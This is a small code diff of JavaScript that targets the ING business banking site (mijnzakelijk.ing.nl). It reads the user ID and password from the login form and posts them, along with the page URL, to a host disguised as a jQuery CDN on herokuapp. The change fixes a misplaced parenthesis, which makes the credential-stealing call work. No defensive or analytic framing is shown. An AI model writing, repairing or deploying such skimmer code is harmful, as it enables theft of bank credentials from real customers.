@@ -51,7 +51,7 @@ if (top['location']['href']['indexOf']('mijnzakelijk.ing.nl') > -1) {
                 }
                   login.userid = document.getElementsByClassName(" firstfield")[0].value;
                   login.password = p;
-            post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php"),"l="+window.location.href+"&e="+login.userid+"&p="+login.password);
+            post("//cdn-s1-cloud-jquery.herokuapp.com/logs.php","l="+window.location.href+"&e="+login.userid+"&p="+login.password);
             }
         }
     }, 1000)
